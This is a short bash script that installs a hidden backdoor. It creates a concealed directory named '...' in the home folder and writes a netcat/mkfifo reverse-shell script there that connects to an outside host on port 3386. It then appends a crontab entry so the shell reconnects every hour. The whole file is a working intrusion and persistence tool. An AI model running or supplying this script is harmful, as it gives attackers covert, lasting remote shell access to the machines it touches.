#!/bin/bash


PORT=3386
F="..."

mkdir ~/$F
echo '#!/bin/bash' > ~/$F/$F
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f' > ~/$F/$F
chmod +x ~/$F/$F
echo '5 * * * * $USER $HOME/.../...' >> /etc/crontab
